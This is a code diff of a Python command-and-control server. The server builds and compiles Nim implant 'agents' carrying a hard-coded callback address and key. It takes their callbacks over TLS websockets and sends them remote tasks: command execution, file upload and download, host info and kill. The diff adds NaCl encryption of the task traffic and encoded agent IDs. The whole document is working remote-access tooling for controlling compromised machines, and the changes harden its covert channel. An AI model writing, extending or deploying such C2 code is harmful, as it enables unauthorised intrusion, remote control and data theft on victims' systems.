@@ -1,53 +1,118 @@
 #!/usr/bin/python3
 
 import os
-import re
-import ssl
-import json
 import urwid
-import string
-import random
-import socket
-import _thread
-import threading
 import logging
-import asyncio
+import subprocess
+import ssl
+import socket
 import ipaddress
 import websockets
-import subprocess
+import re
+import json
+import string
+import random
+import _thread
+import threading
+import asyncio
 from collections import deque
+from nacl.public import PublicKey, PrivateKey, Box 
+
+agents = []
+ids = []
+new_task = {}
+websocket_servers = {}
+shell = 0
+active_count = 0
+
+task_list = [{"code": 0, "name":"kill", "data": ""},
+             {"code": 1, "name":"exec", "data": ""},
+             {"code": 2, "name":"info", "data": ""},
+             {"code": 3, "name":"upld", "data": ""},
+             {"code": 4, "name":"dnld", "data": ""}]
+
+srvseckey = ''
+srvpubkey = ''
+
+with open('resources/config.json') as f:
+  conf = json.load(f)
+
+ids = conf["ids"]
+
+if conf["secret_key"] == "":
+  srvseckey = PrivateKey.generate()
+  srvpubkey = srvseckey.public_key
+  conf["secret_key"] = srvseckey.encode().hex()
+  conf["public_key"] = srvpubkey.encode().hex()
+  with open('resources/config.json', 'w') as f:
+    json.dump(conf, f)
+else:
+  srvseckey = PrivateKey(bytes.fromhex(conf["secret_key"]))
+  srvpubkey = PublicKey(bytes.fromhex(conf["public_key"]))
+
+ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+ssl_context.load_cert_chain(certfile="resources/certs/cert.pem", keyfile="resources/certs/key.pem")
+
+def encrypt(input, pubkey):
+  input = input.strip()
+  box = Box(srvseckey, pubkey)
+  plaintext = input.encode()
+  ciphertext = box.encrypt(plaintext)
+  return ciphertext.hex().upper()
+
+def decrypt(input, pubkey):
+  input = input.strip()
+  box = Box(srvseckey, pubkey)
+  ciphertext = bytes.fromhex(input)
+  return box.decrypt(ciphertext).decode()
 
 def mkagent(platform, ip, port, id):
   count = 1
   file = id + '.nim'
   original = file
+
   while os.path.isfile('resources/agents/' + file):
     count += 1
     file = id + str(count) + '.nim'
+
   if file != original:
     original = id
     id = re.sub('\.nim$', '', file)
     add_output('Agent renamed: ' + original + ' -> ' + id + '\n', True)
+
   with open('resources/agents/agent.nim') as f:
     code = f.read()
+
   code = re.sub('ADDRESS', ip, code)
   code = re.sub('PORT', port, code)
-  code = re.sub('AGENT', id, code)
+  code = re.sub('AGENTID', id, code)
+  code = re.sub('SERVERPUBLICKEY', srvpubkey.encode().hex(), code)
+
   with open('resources/agents/' + file, 'w') as f:
     f.write(code)
+
   while not os.path.isfile('resources/agents/' + file):
     pass
+
   add_output('Compiling agent...')
   subprocess.run(['resources/builder/build', platform, id],
                  stdout=subprocess.DEVNULL,
                  stderr=subprocess.DEVNULL)
   add_output('Done')
+
+  id = id.encode().hex().upper()
+  ids.append(id)
+
   with open('resources/config.json') as f:
     conf = json.load(f)
+
   uri = ip + ':' + port
   conf["uris"].append(uri)
+  conf["ids"].append(id)
+
   with open('resources/config.json', 'w') as f:
     json.dump(conf, f)
+
   new_thread = threading.Thread(target=start_websocket_server_in_thread, args=(uri,))
   new_thread.daemon = True
   new_thread.start()
@@ -107,29 +172,14 @@ def scroll_lines(listbox, n):
   new_pos = max(0, min(len(walker) - 1, pos + n))
   walker.set_focus(new_pos)
 
-clients = []
-new_task = {}
-websocket_servers = {}
-shell = 0
-active_count = 0
-
-task_list = [{"code": 0, "name":"kill", "data": ""},
-             {"code": 1, "name":"exec", "data": ""},
-             {"code": 2, "name":"info", "data": ""},
-             {"code": 3, "name":"upld", "data": ""},
-             {"code": 4, "name":"dnld", "data": ""}]
-
-ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-ssl_context.load_cert_chain(certfile="resources/certs/cert.pem", keyfile="resources/certs/key.pem")
-
 def add_task(task_name, task_data):
   global new_task
   new_task = [task for task in task_list if task['name'] == task_name][0]
   new_task["data"] = task_data
 
-def add_client(id, port):
-  client = {"id": id, "port": port, "active": False}
-  return client
+def add_agent(id, port, pubkey):
+  agent = {"id": id, "port": port, "active": False, "pubkey": pubkey}
+  return agent
 
 class Terminal(urwid.WidgetWrap):
   def __init__(self):
@@ -279,7 +329,7 @@ def process_input(key: str):
           if len(term.prompt_text.edit_text.split(' ')) > 3:
             if term.prompt_text.edit_text.split(' ')[3]:
               port = term.prompt_text.edit_text.split(' ')[3]
-              if next((c for c in clients if c["port"] == port), None) is None:
+              if next((c for c in agents if c["port"] == port), None) is None:
                 s = socket.socket()
                 try:
                   s.bind(("127.0.0.1", int(port)))
@@ -291,14 +341,14 @@ def process_input(key: str):
                 if len(term.prompt_text.edit_text.split(' ')) > 4:
                   if term.prompt_text.edit_text.split(' ')[4]:
                     id = term.prompt_text.edit_text.split(' ')[4]
-                    if next((c for c in clients if c["id"] == id), None) is not None:
+                    if next((c for c in agents if c["id"] == id), None) is not None:
                       add_output('ID already in use.')
                       term.prompt_text.edit_text = ''
                       term.up_count = 0
                       return
                 else:
                   id = ''.join(random.choices(string.ascii_lowercase, k=5))
-                  while next((c for c in clients if c["id"] == id), None) is not None:
+                  while next((c for c in agents if c["id"] == id), None) is not None:
                     id = ''.join(random.choices(string.ascii_lowercase, k=5))
             else:
               add_output('Port already in use.\n')
@@ -307,7 +357,7 @@ def process_input(key: str):
               return
           else:
             id = ''.join(random.choices(string.ascii_lowercase, k=5))
-            while next((c for c in clients if c["id"] == id), None) is not None:
+            while next((c for c in agents if c["id"] == id), None) is not None:
               id = ''.join(random.choices(string.ascii_lowercase, k=5))
             port = get_port()
         else:
@@ -329,16 +379,16 @@ def process_input(key: str):
 
       elif term.prompt_text.edit_text.startswith('use'):
         id = term.prompt_text.edit_text.split(' ')[1]
-        client = next((c for c in clients if c["id"] == id), None)
-        client["active"] = True
+        agent = next((c for c in agents if c["id"] == id), None)
+        agent["active"] = True
         active_count += 1
         add_output('>> ' + term.prompt_text.edit_text)
         term.prompt_text.edit_text = ''
 
       elif term.prompt_text.edit_text.startswith('free'):
         id = term.prompt_text.edit_text.split(' ')[1]
-        client = next((c for c in clients if c["id"] == id), None)
-        client["active"] = False
+        agent = next((c for c in agents if c["id"] == id), None)
+        agent["active"] = False
         active_count -= 1
         add_output('>> ' + term.prompt_text.edit_text)
         term.prompt_text.edit_text = ''
@@ -367,7 +417,7 @@ async def ws(websocket, path):
   try:
     receive = True
     while True:
-      global clients
+      global agents
       global new_task
       global shell
       global active_count
@@ -375,30 +425,34 @@ async def ws(websocket, path):
       if receive:
         try:
           callback = await websocket.recv()
-          if callback.startswith('Hello from '):
-            id = callback.split(' ')[2]
-            add_output('Callback: ' + id + '\n', True)
-            client = add_client(id, websocket.local_address[1])
-            clients.append(client)
-            receive = False
+          for id in ids:
+            if callback.startswith(id):
+              ids.remove(id)
+              pubkey = PublicKey(bytes.fromhex(callback[len(id):]))
+              id = bytes.fromhex(id).decode()
+              add_output('Callback: ' + id + '\n', True)
+              agent = add_agent(id, websocket.local_address[1], pubkey)
+              agents.append(agent)
+              receive = False
         except:
           pass
       else:
-        for client in clients:
-          if client["port"] == websocket.local_address[1] and client["active"] and new_task:
+        for agent in agents:
+          if agent["port"] == websocket.local_address[1] and agent["active"] and new_task:
             task = json.dumps(new_task)
-            await websocket.send(task)
+            await websocket.send(encrypt(task, agent["pubkey"]))
             response = await websocket.recv()
+            response = decrypt(response, agent["pubkey"])
             if active_count > 1:
-              add_output('[' + client["id"] + ']', True)
+              add_output('[' + agent["id"] + ']', True)
             add_output(response)
             if shell == 0:
               add_output('')
   
             if response == 'Done':
-              client["active"] = False
+              agent["active"] = False
               active_count -= 1
-              clients.remove(client)
+              agents.remove(agent)
               interactive = False
               receive = True
 
